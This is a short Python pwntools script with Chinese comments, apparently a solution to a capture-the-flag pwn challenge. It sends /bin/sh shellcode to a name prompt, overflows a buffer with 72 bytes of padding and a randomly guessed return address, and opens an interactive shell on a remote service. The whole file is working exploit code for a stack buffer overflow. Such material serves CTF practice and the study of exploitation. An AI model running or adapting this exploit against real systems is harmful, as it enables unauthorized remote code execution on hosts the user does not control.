# -*- coding: utf-8 -*-
from pwn import *
import random

# --- 配置 ---
REMOTE_IP = 'host.docker.internal'
REMOTE_PORT = 51915
context(arch='amd64', os='linux', log_level='info')
# --- 配置结束 ---


# 1. 准备 Shellcode
# 远程服务器没有 seccomp, 一个 /bin/sh shellcode 即可
shellcode = asm(shellcraft.sh())

# 2. 确定正确的偏移量
# 根据成功的经验，偏移量是 0x48 (72 字节)
offset = 0x48

# 3. 随机选择一个目标地址
# 每次运行脚本时，从8个可能的地址中随机猜一个。
# 这是命题人“不要爆破”的真正含义。
random_multiplier = random.randint(0, 7)
shellcode_addr = 0x20000 + random_multiplier * 0x1000

log.info(f"This attempt will try address: {hex(shellcode_addr)}")

# 4. 构造最终的 Payload
# 用 72 字节的垃圾数据填充，然后跟上我们猜的 shellcode 地址
payload = flat(
    b'A' * offset,
    p64(shellcode_addr)
)

# 5. 执行攻击
try:
    p = remote(REMOTE_IP, REMOTE_PORT, timeout=5)

    # 在第一个提示后，发送 shellcode
    p.sendlineafter(b"what's your name: ", shellcode)

    # 在第二个提示后，发送溢出 payload
    p.sendlineafter(b"try to overflow me~", payload)

    # 如果地址猜对了，就能得到一个 shell
    log.success("Payload sent! If the address was correct, you will get a shell now.")
    p.interactive()

except PwnlibException as e:
    log.warning(f"Attack failed for address {hex(shellcode_addr)}. Please run the script again.")